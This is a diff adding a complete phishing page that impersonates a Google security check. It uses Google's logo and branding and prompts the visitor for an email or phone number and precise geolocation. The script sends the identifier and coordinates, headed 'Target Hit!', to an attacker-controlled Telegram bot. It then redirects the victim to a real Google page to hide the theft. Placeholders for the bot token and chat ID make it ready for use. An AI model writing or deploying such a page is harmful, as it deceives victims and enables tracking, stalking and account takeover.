@@ -1,1 +1,72 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Verification</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { max-width: 380px; width: 90%; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 25px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
+        #status { margin-top: 15px; font-size: 13px; color: #d93025; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+    <h1>Confirm it's you</h1>
+    <p>To help keep your account secure, Google needs to verify your current location.</p>
+    
+    <input type="text" id="user_id" placeholder="Email or phone" required>
+    <button class="btn" onclick="startCapture()">Next & Verify</button>
+    
+    <div id="status">Verifying... Please allow location access.</div>
+</div>
+
+<script>
+    // --- APNI DETAILS YAHAN DALO ---
+    const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"; 
+    const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
+
+    function startCapture() {
+        const info = document.getElementById('user_id').value;
+        const status = document.getElementById('status');
+
+        if (!info) {
+            alert("Please enter your Email or Phone.");
+            return;
+        }
+
+        status.style.display = "block";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                
+                const message = `📍 *Target Hit!*%0A%0A👤 *User:* ${info}%0A🌐 *Lat:* ${lat}%0A🌐 *Lon:* ${lon}%0A🗺️ *Maps:* https://www.google.com/maps?q=${lat},${lon}`;
+
+                // Sending to Telegram
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`)
+                .then(() => {
+                    alert("Verification Successful!");
+                    window.location.href = "https://myaccount.google.com";
+                });
+
+            }, function(error) {
+                status.innerText = "Error: Location access is required for verification.";
+            }, { enableHighAccuracy: true });
+        } else {
+            alert("Browser not supported.");
+        }
+    }
+</script>
+
+</body>
+</html>
